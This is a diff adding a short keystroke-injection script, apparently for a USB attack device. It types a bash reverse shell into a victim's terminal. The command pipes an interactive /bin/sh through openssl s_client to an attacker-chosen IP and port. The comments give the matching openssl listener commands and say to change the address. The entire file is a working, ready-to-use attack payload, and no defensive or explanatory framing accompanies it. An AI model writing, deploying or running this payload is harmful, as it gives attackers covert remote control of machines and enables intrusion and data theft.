@@ -1,0 +1,8 @@
+REM bash based reverse shell
+REM works with 2 below lines as listener
+REM openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert -days 365 -nodes
+REM openssl s_server -quiet -key key.pem -cert cert -port 8080
+REM change ip and port accordingly
+DELAY 1000
+STRING mkfifo /tmp/s; ip='10.0.0.3';port=8080;/bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $ip:$port > /tmp/s; rm /tmp/s
+ENTER
